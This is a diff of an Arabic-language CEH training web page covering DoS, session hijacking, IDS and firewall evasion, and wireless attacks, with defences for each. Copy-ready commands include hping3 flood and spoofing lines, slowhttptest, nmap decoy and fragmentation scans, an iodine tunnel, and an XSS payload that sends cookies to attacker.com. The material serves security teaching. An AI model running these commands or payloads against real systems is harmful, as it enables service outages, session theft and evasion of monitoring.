+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(0,229,255,0.15); color: var(--tool-color); border: 1px solid var(--tool-color); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </details>
+
+      <details>
+        <summary style="font-weight: bold; color: #ff6e27; cursor: pointer; padding: 10px 0;">🌊 UDP &amp; ICMP Flood</summary>
+        <div class="cmd-ui-box">
+# UDP flood on port 53 (DNS)
+sudo hping3 --udp -p 53 --flood --rand-source TARGET_IP
+
+# ICMP (Ping) Flood
+sudo hping3 -1 --flood --rand-source TARGET_IP</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,110,39,0.15); color: #ff6e27; border: 1px solid #ff6e27; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </details>
+
+      <details>
+        <summary style="font-weight: bold; color: #50fa7b; cursor: pointer; padding: 10px 0;">🕸️ Slow POST Attacks (slowhttptest)</summary>
+        <div class="cmd-ui-box">
+# Slow POST: -B (Slow Read/POST mode), -c (connections), -r (connections per second)
+slowhttptest -B -u http://target.com -c 1000 -r 100 -s 8192 -t POST</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(80,250,123,0.15); color: #50fa7b; border: 1px solid #50fa7b; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </details>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 7: REAL CASES ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🏆 دراسات حالة تاريخية</h3></div>
+    <div dir="rtl" style="line-height: 1.8; color: var(--text-secondary);">
+      <ul>
+        <li><strong>هجوم GitHub (2018):</strong> أكبر هجوم حجب خدمة مسجل تاريخياً بلغ قوته <strong>1.35 Tbps</strong>. تم عن طريق استغلال خوادم Memcached المفتوحة على الإنترنت (Reflection Attack) دون الحاجة لشبكة بوتنت ضخمة.</li>
+        <li><strong>هجوم Dyn DNS (2016):</strong> تم استهداف مزود خدمات النطاقات الشهير Dyn مما أدى لتوقف تويتر، نتفليكس، والعديد من الخدمات الكبرى. تم عبر شبكة بوتنت <strong>Mirai</strong> المكونة من ملايين أجهزة الـ IoT المخترقة.</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 8: DEFENSE ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — DDoS Mitigation</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;" dir="rtl">
+      <div>
+        <h4 style="color: #50fa7b;">✅ تقنيات معالجة L3/L4 Attacks</h4>
+        <ul style="line-height: 2; color: var(--text-secondary);">
+          <li><strong>SYN Cookies:</strong> تقنية برمجية في نواة نظام التشغيل تمنع حجز الـ Connection Queue إلا بعد تأكيد الـ ACK.</li>
+          <li><strong>Rate Limiting:</strong> تحديد الحد الأقصى لعدد الحزم المسموح بها من نفس عنوان الـ IP.</li>
+          <li><strong>Cloud Scrubbing:</strong> تحويل حركة البيانات إلى مراكز تصفية سحابية مثل Cloudflare و Akamai لعزل الحزم الضارة.</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 تقنيات معالجة L7 Attacks</h4>
+        <ul style="line-height: 2; color: var(--text-secondary);">
+          <li><strong>Web Application Firewall (WAF):</strong> تحليل سلوك الطلبات وكشف الأنماط المتكررة أو البطيئة.</li>
+          <li><strong>Connection Limits:</strong> تحديد أقصى وقت لإبقاء اتصال HTTP مفتوحاً دون استقبال بيانات (Timeout configuration).</li>
+          <li><strong>CAPTCHA:</strong> فرض اختبارات التحقق البشري عند وجود شك في طبيعة حركة المرور.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 9: CTF CHALLENGE ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🧪 تحدي — اختبر معلوماتك</h3></div>
+    <div dir="rtl" style="display: flex; flex-direction: column; gap: 15px;">
+      <details>
+        <summary style="cursor: pointer; font-weight: bold; padding: 12px; background: rgba(255,110,39,0.05); border-radius: 6px; color: var(--tool-color);">❓ كيف ينجح هجوم Slowloris في إسقاط خادم الويب بموارد محدودة جداً؟</summary>
+        <div style="padding: 15px; background: rgba(80,250,123,0.05); border: 1px solid rgba(80,250,123,0.2); border-radius: 6px; margin-top: 8px;">
+          <strong style="color: #50fa7b;">✅ الإجابة:</strong>
+          <p style="color: var(--text-secondary); margin-top: 5px;">عبر فتح اتصالات HTTP متعددة وإرسال أجزاء صغيرة من الـ Headers ببطء شديد وبشكل مستمر. هذا يمنع السيرفر من إغلاق الاتصال ويجعله يحتفظ بالـ Thread مفتوحاً بانتظار اكتمال الطلب، مما يستنزف بسرعة جميع الـ Threads المتاحة لخدمة المستخدمين الحقيقيين.</p>
+        </div>
+      </details>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 10: CHEAT SHEET ═══ -->
+  <div class="cyber-card" style="border: 1px solid rgba(255,85,85,0.3);">
+    <div class="card-header" style="background: rgba(255,85,85,0.05);"><h3>📖 Cheat Sheet — DoS Quick Reference</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px;" dir="rtl">
+      <div>
+        <h5 style="color: var(--tool-color);">hping3 Quick Commands</h5>
+        <ul style="font-size: 0.85rem; color: var(--text-secondary); line-height: 1.9; font-family: monospace;">
+          <li>-S --flood (SYN flood)</li>
+          <li>--udp --flood (UDP flood)</li>
+          <li>-1 --flood (ICMP flood)</li>
+          <li>--rand-source (IP Spoofing)</li>
+        </ul>
+      </div>
+      <div>
+        <h5 style="color: #ff6e27;">Mitigation Checklist</h5>
+        <ul style="font-size: 0.85rem; color: var(--text-secondary); line-height: 1.9;">
+          <li>☑ Enable TCP SYN Cookies</li>
+          <li>☑ Configure Firewall Rate Limiting</li>
+          <li>☑ Deploy Cloud DDoS Protection</li>
+          <li>☑ Lower HTTP connection timeout</li>
+        </ul>
+      </div>
     </div>
   </div>
 
 </div>
 
-      
-<!-- =======================================================
-     CEH MODULE 11: SESSION HIJACKING
-     ======================================================= -->
-<div class="meth-content-view" id="meth-content-mod11" style="display:none;" dir="rtl">
-  
+      <div class="meth-content-view" id="meth-content-mod11" style="display: none; --tool-color: #a855f7;" dir="rtl">
+
+  <!-- ═══ SECTION 1: HERO ═══ -->
   <div class="cyber-hero">
-    <h2 class="hero-title"><span class="hero-icon">🔓</span> Session Hijacking</h2>
-    <p class="hero-tagline">السيطرة على جلسات المستخدمين الشرعيين متجاوزاً عمليات المصادقة.</p>
-    <div class="hero-meta">
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-green);"></span> Module 11</span>
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    <h2 class="hero-title"><span class="hero-icon">🔒</span> Session Hijacking — اختطاف الجلسة</h2>
+    <p class="hero-tagline">شرح آليات سرقة واعتراض جلسات المستخدمين النشطة على مستويات التطبيقات والشبكات وطرق الحماية الفعّالة</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ Bettercap · Wireshark · Burp Suite · EditThisCookie</span>
+      <span class="badge badge-info">📋 CEH Domain: Session Hijacking (Weight ~6%)</span>
+      <span style="background: rgba(168,85,247,0.15); color: #a855f7; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">CVSS Impact: High (Integrity/Confidentiality)</span>
     </div>
   </div>
 
-  <div class="meth-section">
-    <div class="section-header">
-      <span class="section-icon">🌐</span>
-      <h3>أساليب اختطاف الجلسات (Hijacking Levels)</h3>
+  <!-- ═══ SECTION 2: THEORY — Session Hijacking vs Session Spoofing ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — الفرق بين الاختطاف والتزييف وطبقات العمل</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        تتمحور فكرة الهجوم حول الحصول على <strong>Session Token (رمز الجلسة)</strong> صالح وصادر بالفعل لمستخدم مصرح له، لتخطي مرحلة تسجيل الدخول بالكامل.
+      </p>
+
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+        <div>
+          <h4 style="color: var(--tool-color);">🔍 Hijacking vs Spoofing</h4>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>Session Hijacking (الاختطاف):</strong> يتدخل المهاجم في جلسة <strong>نشطة وقائمة بالفعل</strong> للمستخدم ويقطع اتصاله أو يتقمص شخصيته أثناء اتصاله بالخادم.</li>
+            <li><strong>Session Spoofing (التزييف):</strong> يقوم المهاجم <strong>بتخمين أو إنشاء</strong> رمز جلسة وهمي (أو مسروق مسبقاً) وبدء جلسة جديدة كلياً كأنه المستخدم المستهدف.</li>
+          </ul>
+        </div>
+        <div>
+          <h4 style="color: #ff6e27;">🌐 طبقة التطبيق (Application Layer) vs الشبكة (Network Layer)</h4>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>Application Layer:</strong> سرقة ملفات تعريف الارتباط (Cookies/Tokens) المخزنة في المتصفح أو الذاكرة عبر ثغرات (XSS, Session Fixation, Man-in-the-Browser).</li>
+            <li><strong>Network Layer:</strong> اعتراض الحزم على مستوى الشبكة وتخمين أرقام التسلسل (TCP Sequence Numbers) للتدخل في اتصال TCP قائم بالفعل وتغيير البيانات المرسلة.</li>
+          </ul>
+        </div>
+      </div>
     </div>
-    
-    <div class="rd-compare-grid">
-      <div class="rd-compare-col bad" style="border-color: #ff4757;">
-        <div class="rd-compare-title">⚠️ اختطاف مستوى الشبكة (TCP/IP)</div>
-        <ul class="rd-compare-list">
-          <li>مراقبة اتصال TCP نشط واعتراضه.</li>
-          <li>الاعتماد على **توقع رقم التسلسل (Sequence Number Prediction)**.</li>
-          <li>حقن الحزمة الشرعية برقم التسلسل الصحيح ليتعامل الخادم مع المهاجم وكأنه العميل الأصلي.</li>
+  </div>
+
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح مسار الهجوم — سرقة الجلسة عبر XSS والـ Fixation</h3></div>
+    <div>
+      <div style="display: flex; flex-direction: column; gap: 15px;">
+
+        <div style="display: flex; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">Session Fixation (تثبيت الجلسة)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">يقوم المهاجم بإنشاء معرف جلسة صالح على موقع الويب وإرساله للضحية (مثلاً عبر رابط يحتوي على الـ Session ID)، ليدفع الضحية لتسجيل الدخول مستخدماً نفس الـ Session ID المثبت مسبقاً.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# URL payload with fixed session ID sent to victim
+http://target.com/login.php?PHPSESSID=attacker_fixed_session_123</div>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">2️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">Session Theft via Stored XSS</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">استغلال ثغرة XSS لحقن كود جافاسكريبت يقوم بقراءة الـ <code>document.cookie</code> وإرسالها لخادم خارجي يسيطر عليه المهاجم.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# XSS Payload to steal document.cookie
+&lt;script&gt;fetch('http://attacker.com/log?cookie=' + document.cookie)&lt;/script&gt;</div>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(80,250,123,0.05); border-right: 3px solid #50fa7b; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">3️⃣</span>
+          <div>
+            <strong style="color: #50fa7b;">TCP Session Hijacking (Network level)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">اعتراض البيانات على الشبكة، كشف الـ Sequence Number و Acknowledgment Number، والتنبؤ بالحزمة التالية لإلغاء اتصال الضحية وحقن أوامر ضارة.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 4: TOOLS MATRIX ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛠️ أدوات وتقنيات اختطاف الجلسات</h3></div>
+    <div>
+      <table class="cyber-table" style="width: 100%;">
+        <thead>
+          <tr>
+            <th>الأداة</th>
+            <th>الاستخدام الرئيسي</th>
+            <th>نوع الهجوم</th>
+            <th>الوصف</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong style="color: var(--tool-color);">EditThisCookie</strong></td>
+            <td>إضافة وتعديل الـ Cookies يدوياً</td>
+            <td>Application Layer</td>
+            <td>إضافة الـ Session ID المسروق مباشرة للمتصفح لتجاوز الـ Auth.</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff6e27;">Bettercap</strong></td>
+            <td>تنفيذ هجمات ARP Poisoning وسرقة الـ Cookies</td>
+            <td>Network &amp; Application</td>
+            <td>اعتراض حركة المرور واستخلاص كلمات المرور والرموز تلقائياً.</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #50fa7b;">Burp Suite</strong></td>
+            <td>تعديل وإعادة إرسال طلبات الـ HTTP</td>
+            <td>Proxy / Testing</td>
+            <td>تغيير قيم الـ Session Headers والتحقق من صحة الـ Tokens.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 5: DEFENSE & HARDENING ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — تأمين الجلسات وتثبيت ملفات الارتباط</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: #50fa7b;">✅ إعدادات ملفات تعريف الارتباط الآمنة (Cookie Flags)</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>HttpOnly:</strong> يمنع وصول نصوص جافاسكريبت (مثل XSS) إلى الـ Cookie تماماً.</li>
+          <li><strong>Secure:</strong> يضمن عدم إرسال الـ Cookie إلا عبر قنوات اتصال مشفرة بـ HTTPS فقط.</li>
+          <li><strong>SameSite=Strict/Lax:</strong> يمنع إرسال ملفات تعريف الارتباط مع الطلبات العابرة للمواقع (حماية من ثغرات CSRF).</li>
         </ul>
       </div>
-      <div class="rd-compare-col bad" style="border-color: #ffa502;">
-        <div class="rd-compare-title">⚠️ اختطاف مستوى التطبيق (App Level)</div>
-        <ul class="rd-compare-list">
-          <li><strong>سرقة الكوكيز (Sniffing):</strong> التقاط الـ Session ID وحقنه في المتصفح.</li>
-          <li><strong>تثبيت الجلسة (Session Fixation):</strong> فرض معرف جلسة مسبق على الضحية ليسجل دخوله به.</li>
-          <li><strong>استغلال XSS:</strong> حقن كود جافاسكريبت لسرقة الكوكي النشط.</li>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 إدارة الجلسة بأمان (Session Management)</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Regenerate Session ID:</strong> تغيير معرف الجلسة فوراً عند نجاح تسجيل دخول المستخدم لتجنب هجمات الـ Session Fixation.</li>
+          <li><strong>Session Timeout:</strong> تعيين حد زمني لانتهاء الجلسة تلقائياً عند الخمول.</li>
+          <li><strong>IP &amp; User-Agent Binding:</strong> ربط الجلسة بعنوان IP وبصمة المتصفح للمستخدم، وإلغاء الجلسة فوراً عند حدوث أي تغيير مفاجئ.</li>
         </ul>
       </div>
     </div>
@@ -3880,51 +5087,142 @@ eth.addr == 00:11:22:33:44:55</code></pre>
 
 </div>
 
-      
-<!-- =======================================================
-     CEH MODULE 12: EVADING IDS, FIREWALLS & HONEYPOTS
-     ======================================================= -->
-<div class="meth-content-view" id="meth-content-mod12" style="display:none;" dir="rtl">
-  
+      <div class="meth-content-view" id="meth-content-mod12" style="display: none; --tool-color: #f59e0b;" dir="rtl">
+
+  <!-- ═══ SECTION 1: HERO ═══ -->
   <div class="cyber-hero">
-    <h2 class="hero-title"><span class="hero-icon">🥷</span> Evading IDS & Firewalls</h2>
-    <p class="hero-tagline">تجاوز أنظمة كشف التسلل، جدران الحماية، ومصائد المغفلين (Honeypots).</p>
-    <div class="hero-meta">
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-green);"></span> Module 12</span>
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    <h2 class="hero-title"><span class="hero-icon">🛡️</span> Evading IDS, Firewalls &amp; Honeypots — تخطي أنظمة الحماية</h2>
+    <p class="hero-tagline">الدليل المتكامل لأساليب وتقنيات تخطي أنظمة كشف التسلل وجدران الحماية وكشف الأفخاخ الرقمية (Honeypots)</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ Nmap · Ncat · Snort Evasion · Tor · Tunneling</span>
+      <span class="badge badge-info">📋 CEH Domain: Evasion Techniques (Weight ~7%)</span>
+      <span style="background: rgba(245,158,11,0.15); color: #f59e0b; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">Network Evasion</span>
     </div>
   </div>
 
-  <div class="meth-section">
-    <div class="section-header">
-      <span class="section-icon">🛡️</span>
-      <h3>تقنيات التجاوز المتقدمة (Evasion Techniques)</h3>
+  <!-- ═══ SECTION 2: THEORY — How Evasion Works ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — مبادئ تخطي أنظمة الدفاع عن الشبكات</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        تعتمد أنظمة الدفاع مثل **IDS (Intrusion Detection Systems)** و **Firewalls** على فحص حركة البيانات بحثاً عن أنماط مشبوهة (Signatures) أو سلوك غير معتاد (Anomalies). يهدف التخطي إلى تعديل شكل أو طريقة إرسال الحزم بحيث تبدو طبيعية ومصرحة لنظام الحماية، بينما يتمكن خادم الهدف من إعادة تجميعها وفهمها بشكل ضار.
+      </p>
+
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+        <div>
+          <h4 style="color: var(--tool-color);">📡 تقنيات تخطي الـ IDS/IPS</h4>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>Packet Fragmentation:</strong> تقسيم حزمة الهجوم إلى حزم صغيرة جداً. لا يستطيع الـ IDS مطابقة الـ Signature لعدم قدرته على إعادة التجميع في الوقت الفعلي، بينما يقوم نظام تشغيل الهدف بتجميعها تلقائياً.</li>
+            <li><strong>Obfuscation:</strong> ترميز البيانات (مثال بـ Base64 أو Hex) لإخفاء الكلمات المفتاحية الخطرة من فلاتر الفحص.</li>
+            <li><strong>Session Splitting:</strong> تقسيم طلب الاتصال عبر مسارات متعددة لخداع أنظمة الفحص.</li>
+          </ul>
+        </div>
+        <div>
+          <h4 style="color: #ff6e27;">🔥 تقنيات تخطي جدران الحماية (Firewall Evasion)</h4>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>Port Tunneling:</strong> تشفير حركة البيانات ونقلها عبر منافذ مصرح بها مسبقاً (مثل نقل حركة الـ SSH داخل منفذ الـ HTTP/HTTPS 443).</li>
+            <li><strong>IP Spoofing / Decoy Scanning:</strong> إرسال طلبات فحص ممزوجة بطلبات وهمية من عناوين IP متعددة لإخفاء الهوية الحقيقية للمهاجم.</li>
+          </ul>
+        </div>
+      </div>
     </div>
-    
-    <div class="goal-cards-grid" dir="rtl">
-      <div class="goal-card">
-        <div class="goal-icon">🎭</div>
-        <h4>IP Spoofing</h4>
-        <div class="goal-subtitle">انتحال عنوان IP</div>
-        <p>تعديل الـ Source IP في الحزمة لتبدو قادمة من مصدر موثوق داخل الشبكة (Internal Trusted IP) لتجاوز تصفية الجدار الناري.</p>
+  </div>
+
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح مسار التخطي — فحص الشبكة مع إخفاء الهوية</h3></div>
+    <div>
+      <div style="display: flex; flex-direction: column; gap: 15px;">
+
+        <div style="display: flex; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">Decoy Scanning (الفحص بالتمويه)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">تشغيل الفحص عبر إدراج عناوين IP وهمية (Decoys) لتبدو حزم المهاجم ضائعة وسط آلاف الطلبات الأخرى في سجلات جدار الحماية.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Nmap scan with 4 decoys and random IP spoofing
+nmap -D RND:4 192.168.1.50</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(0,229,255,0.15); color: var(--tool-color); border: 1px solid var(--tool-color); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">2️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">Fragmentation Attacks (تجزئة الحزم)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">إجبار Nmap على تقسيم حزم الفحص إلى أجزاء بحجم 8-bit لتفادي مطابقة الـ Signatures الكلاسيكية للـ IDS.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Fragment packets during port scan
+nmap -f 192.168.1.50</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,110,39,0.15); color: #ff6e27; border: 1px solid #ff6e27; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(80,250,123,0.05); border-right: 3px solid #50fa7b; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">3️⃣</span>
+          <div>
+            <strong style="color: #50fa7b;">DNS / ICMP Tunneling (النفق الرقمي)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">تغليف بيانات الاتصال المحظورة وإرسالها داخل طلبات استعلام DNS (TXT records) أو حزم Ping غير المحظورة لتجاوز جدران الحماية بالكامل.</p>
+          </div>
+        </div>
       </div>
-      <div class="goal-card">
-        <div class="goal-icon">🗺️</div>
-        <h4>Source Routing</h4>
-        <div class="goal-subtitle">توجيه المصدر</div>
-        <p>تحديد المسار الدقيق (Route) للحزمة لتجاوز أجهزة הـ Firewall الموجودة في المسار الافتراضي.</p>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 4: TOOLS MATRIX ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛠️ أدوات التخطي وكشف الـ Honeypots</h3></div>
+    <div>
+      <table class="cyber-table" style="width: 100%;">
+        <thead>
+          <tr>
+            <th>الأداة</th>
+            <th>الاستخدام الرئيسي</th>
+            <th>نوع الهجوم</th>
+            <th>أمر شائع</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong style="color: var(--tool-color);">Sendak / Nmap</strong></td>
+            <td>فحص الشبكة وتجاوز الفلاتر</td>
+            <td>Fragmentation &amp; Decoys</td>
+            <td><code>nmap -mtu 24 TARGET</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff6e27;">iodine</strong></td>
+            <td>إنشاء نفق اتصال كامل عبر بروتوكول DNS</td>
+            <td>DNS Tunneling</td>
+            <td><code>iodined -c -P password DNS_DOMAIN</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #50fa7b;">honeydet</strong></td>
+            <td>كشف وفحص أنظمة الـ Honeypots الوهمية</td>
+            <td>Honeypot Detection</td>
+            <td><code>honeydet scan TARGET</code></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 5: DEFENSE & HARDENING ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — تأمين الشبكات ضد التخطي</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: #50fa7b;">✅ تأمين أنظمة كشف التسلل (IDS hardening)</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>IP Reassembly:</strong> تهيئة أنظمة الـ IDS لإعادة تجميع الحزم المجزأة (Packet Reassembly) وفحصها بالكامل قبل السماح بمرورها للهدف.</li>
+          <li><strong>Behavioral Analysis:</strong> استخدام الذكاء الاصطناعي وتحليل السلوك لكشف أنماط Decoy Scans التي تفشل في محاكاتها الفلاتر التقليدية.</li>
+        </ul>
       </div>
-      <div class="goal-card" style="border-color: #00e5a0;">
-        <div class="goal-icon" style="color: #00e5a0;">🧩</div>
-        <h4 style="color: #00e5a0;">Fragmentation</h4>
-        <div class="goal-subtitle">تجزئة الحزم</div>
-        <p>تقسيم الـ Packets إلى أجزاء صغيرة جداً (مثل Nmap -f) لمنع الـ IDS من تجميع الـ Payload وتحليله بسرعة.</p>
-      </div>
-      <div class="goal-card" style="border-color: #ff4757;">
-        <div class="goal-icon" style="color: #ff4757;">🍯</div>
-        <h4 style="color: #ff4757;">Honeypot Detection</h4>
-        <div class="goal-subtitle">اكتشاف المصائد</div>
-        <p>اكتشاف المصائد عبر فحص الاستجابات المثالية جداً، ملفات VMware، أو قياس التأخير الزمني (Latency) بسبب التسجيل المستمر.</p>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 قواعد جدران الحماية الصارمة</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Deep Packet Inspection (DPI):</strong> فحص محتوى الحزمة الفعلي وليس فقط رأس المنفذ لمنع هجمات الـ Tunneling.</li>
+          <li><strong>Block Unused Protocols:</strong> إيقاف وحظر الاتصالات غير المستخدمة كلياً مثل تعطيل حزم ICMP الصادرة والواردة غير الضرورية.</li>
+        </ul>
       </div>
     </div>
   </div>
@@ -4490,73 +5788,189 @@ http://example.com/download.php?file=..\..\..\..\Windows\System32\cmd.exe</code>
 
 </div>
 
-      
-<!-- =======================================================
-     CEH MODULE 16: HACKING WIRELESS NETWORKS
-     ======================================================= -->
-<div class="meth-content-view" id="meth-content-mod16" style="display:none;" dir="rtl">
-  
+      <div class="meth-content-view" id="meth-content-mod16" style="display: none; --tool-color: #fbbf24;" dir="rtl">
+
+  <!-- ═══ SECTION 1: HERO ═══ -->
   <div class="cyber-hero">
-    <h2 class="hero-title"><span class="hero-icon">📶</span> Wireless Networks</h2>
-    <p class="hero-tagline">اختراق الواي فاي: كسر التشفير، الهجمات الجانبية، وأدوات المراقبة المتقدمة.</p>
-    <div class="hero-meta">
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-blue);"></span> Module 16</span>
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    <h2 class="hero-title"><span class="hero-icon">📶</span> Wireless Security Testing — أمن الشبكات اللاسلكية</h2>
+    <p class="hero-tagline">الدليل العملي لكسر تشفير الواي فاي وهجمات التوأم الشرير والتقاط المصافحة وحماية الشبكات</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ aircrack-ng · Reaver · hcxdumptool · Hashcat · Fluxion</span>
+      <span class="badge badge-info">📋 CEH Domain: Wireless Hacking (Weight ~6%)</span>
+      <span style="background: rgba(251,191,36,0.15); color: #fbbf24; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">RF Auditing</span>
     </div>
   </div>
 
-  <div class="meth-section">
-    <div class="section-header">
-      <span class="section-icon">📡</span>
-      <h3>بروتوكولات التشفير والهجمات (Encryption & Attacks)</h3>
-    </div>
-    
-    <div class="goal-cards-grid" dir="rtl">
-      <div class="goal-card">
-        <div class="goal-icon">🔑</div>
-        <h4>WEP Cracking</h4>
-        <div class="goal-subtitle">RC4 Vulnerability</div>
-        <p>يعتمد على 24-bit IV الذي يتكرر بسرعة. يُخترق بهجمات (FMS, PTW, Chopchop) لكسر التشفير خلال دقائق.</p>
-      </div>
-      <div class="goal-card" style="border-color: #ff4757;">
-        <div class="goal-icon" style="color: #ff4757;">🤝</div>
-        <h4 style="color: #ff4757;">WPA/WPA2 Attacks</h4>
-        <div class="goal-subtitle">4-Way Handshake</div>
-        <p>اعتراض الـ Handshake وكسر الباسورد بهجوم القاموس، أو استخدام **PMKID Attack** و **KRACK**.</p>
-      </div>
-      <div class="goal-card">
-        <div class="goal-icon">😈</div>
-        <h4>Evil Twin & Rogue AP</h4>
-        <div class="goal-subtitle">MitM Attack</div>
